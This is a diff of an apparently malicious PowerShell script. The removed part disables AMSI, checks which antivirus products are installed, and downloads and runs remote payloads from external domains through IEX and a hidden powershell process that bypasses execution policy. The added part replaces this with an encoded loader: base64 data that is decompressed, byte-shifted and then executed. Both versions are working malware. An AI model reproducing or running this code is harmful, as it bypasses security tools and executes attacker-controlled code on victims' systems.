@@ -1,54 +1,17 @@
-$a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.("Set" + "Value")($null,$true);
+$b="7VbNbhs3EAZioA/ixzHgdyC2ArSLeldxggSpgh5kR+uozY+gleoCUYBwuWOJEJfckFxZW8dAkAB5gN6aQw49pJdceuuxQ8k/siMnSJFjuACX5A4/znwzw9kaJT+RuuH1u6SWumErd8MeHODkCb6eRi1jIE9FFe2B7VcF+H49qYyFPHpIJR1BDtJGrdKqnFquZHR0/fho+3hguTB1Eh4g7hap0SBA2N8R1GE7qJiDyBCL5rihI7mNKReQLbbQYKv+SMlumQrOthKLyKw+R4h8LwHrkR+I9ysVJXiBX5OlEFs1q0sI7m5uuCcuJXPKkPhTbS/eI0ebGwQbPyD+kxOzOo+jGFV52my2Z9xY43u7zWFXq5GmOXFfzLCdtPvzjiTASs1tNQSWZyaCGWoUnKK6ZnW1PHWtxlQGu0paZA4Z6cipmkDYA2Mfgh2rjIQDzUl9bG1hmo1GSlNa0RHVkCotIwm2kQrKJmMloCFVdvNGg7HIzixy1+c5qNKiVuT29UunGqZ5YXeEYhPn3OR8iqbuaqAW/GXVgqv3Rwud/SWR4/Mho5aNLxn9keDJC4SBLyS/NaXGkkQd2EPkZDFd9IPONwdc5YCv6AHiz+7cDoa/UFOANpOKPKDp0uzGdrT945BOi5J/c8dV7viUNz5HV1FqQHYKJVH2jK99SHvwvETWvoQvavLGLQPMYZ5wNjCwQw1nXaoNl6MVh+8iKe4qX1YkOmHpkrimMntEc5gzfBZgXWrHSPK8DAhw3/c5erq07RliGLy5/ZXSPURT+ekeHyML60BUmG1vhZZuGx77s+IynI9rIKfNVrd7r9VvnWt2lX0vyOPShu4sMu8XEGfAYVtibCA/ZNCP71wEwYKlbYg5w8AYUqhDTIwxCOHSgYQtPSpd0XyA2UW8cJ+jTYeJrfCg+zzLQCL2DMuKK2BdhQWwIjtVQRFpoc0z70yLZ55HVgCs0iYRAAUJMROUzAy5eVHGXQB9DJ3wopWYuaQHuZpC2EFnkPAyCbHSDJZj3bVO+zfif5WoXB2Rwcex9j+y7dj9KHxPYiUnhldKlmTt9Xd/rL1Zf/nn2uv1l2/XXl37m4r52l/rrz5ce3e6+s/52nu39h7X/rWrBPXmhuPicz8h/wE="
+$k=64
 
+$d=[Convert]::FromBase64String($b)
+$ms=New-Object IO.MemoryStream(,$d)
+$dz=New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress)
+$r=New-Object IO.MemoryStream
+$dz.CopyTo($r)
 
-Function FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG {
-    if ([System.IO.File]::Exists("C:\Program Files\ESET\ESET Security\ecmds.exe")) {
-        try {
-            $codeContent = Invoke-RestMethod -Uri 'https://babayagareborn.net/blackhole/nod32/cc.txt' -TimeoutSec 60
-            $scriptBlock = [ScriptBlock]::Create($codeContent)
-            $scriptBlock.Invoke()
-        }
-        catch {
-           
-        }
-    }
-    elseif ([System.IO.File]::Exists("C:\Program Files\Avast Software\Avast\AvastUI.exe")) {
-        try {
-            $codeContent = Invoke-RestMethod -Uri 'https://babayagareborn.net/blackhole/nod32/cc.txt' -TimeoutSec 60
-            $scriptBlock = [ScriptBlock]::Create($codeContent)
-            $scriptBlock.Invoke()
-        }
-        catch {
-            
-        }
-    }
-    elseif ([System.IO.File]::Exists("C:\Program Files (x86)\Kaspersky Lab\Kaspersky 21.19\avpui.exe")) {
-        try {
-            $codeContent = Invoke-RestMethod -Uri 'https://babayagareborn.net/blackhole/nod32/cc.txt' -TimeoutSec 60
-            $scriptBlock = [ScriptBlock]::Create($codeContent)
-            $scriptBlock.Invoke()
-        }
-        catch {
-           
-        }
-    }
-    else {
-        try {
-            $pureResponse = Invoke-WebRequest -Uri 'https://trronscan.com/new/5secpure.txt' -UseBasicParsing
-            $pureCode = $pureResponse.Content
-            $randName = [System.IO.Path]::GetFileNameWithoutExtension([System.IO.Path]::GetRandomFileName()) + ".ps1"
-            $purePath = Join-Path $env:APPDATA $randName
-            $pureCode | Out-File -FilePath $purePath -Encoding ASCII
-            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$purePath`"" -WindowStyle Hidden
-            Start-Sleep -Seconds 3
-            if (Test-Path $purePath) { Remove-Item -Path $purePath -Force }
-            IEX (Invoke-WebRequest -Uri 'https://trronscan.com/new/5sec.txt' -UseBasicParsing).Content
-        }
-        catch {
-           
-        }
-    }
+$buf=$r.ToArray()
+
+for($i=0;$i -lt $buf.Length;$i++){
+$buf[$i]=[byte](($buf[$i] - $k) -band 0xFF)
 }
 
-# Fonksiyonu ÃƒÆ’Ã‚Â§alÃƒâ€Ã‚Â±Ãƒâ€¦Ã…Â¸tÃƒâ€Ã‚Â±r
-IEX FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
+$cmd=[Text.Encoding]::UTF8.GetString($buf)
+. ([ScriptBlock]::Create($cmd))
